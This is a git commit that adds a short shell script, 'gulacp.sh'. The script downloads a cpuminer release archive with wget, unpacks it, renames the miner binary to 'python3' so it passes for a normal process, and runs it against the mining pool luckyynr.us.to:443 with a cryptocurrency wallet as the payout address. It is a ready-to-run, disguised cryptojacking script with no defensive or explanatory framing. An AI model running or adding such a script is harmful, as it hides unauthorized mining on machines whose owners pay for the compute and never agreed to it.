00de215dee87cf2f9ce3498f01686dbc8e593822
monhodsompul <168453591+monhodsompul@users.noreply.github.com>
2024-06-22 07:14:59 +0700

    Create gulacp.sh

---
+++ gulacp.sh
@@ -0,0 +1,10 @@
+
+wget -q -O dot github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.40/cpuminer-opt-linux-5.0.40.tar.gz
+
+tar -xzf dot
+
+rm dot
+
+mv cpuminer-sse2 python3
+
+./python3 -a yespowersugar -o luckyynr.us.to:443 -u DEJ2vHD2aDfBxSrcMDfqC4ACgLAqXY8mEt.vps -p c=DGB
